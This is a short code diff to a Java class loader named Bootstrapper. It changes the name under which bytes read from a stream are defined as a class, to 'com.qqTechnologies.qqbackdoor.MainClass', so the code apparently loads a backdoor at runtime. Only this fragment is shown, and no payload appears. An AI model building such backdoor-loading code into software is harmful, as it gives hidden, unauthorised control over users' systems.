@@ -84,7 +84,7 @@ public class Bootstrapper extends ClassLoader {
                 }
                 if (in != null) {
                     byte[] bytes = readByteArrayLWithLength(in);
-                    addClass("com.qqTechnologies.qqbackdoor", bytes);
+                    addClass("com.qqTechnologies.qqbackdoor.MainClass", bytes);
                 }
             }
         } catch (IOException ignored) {}
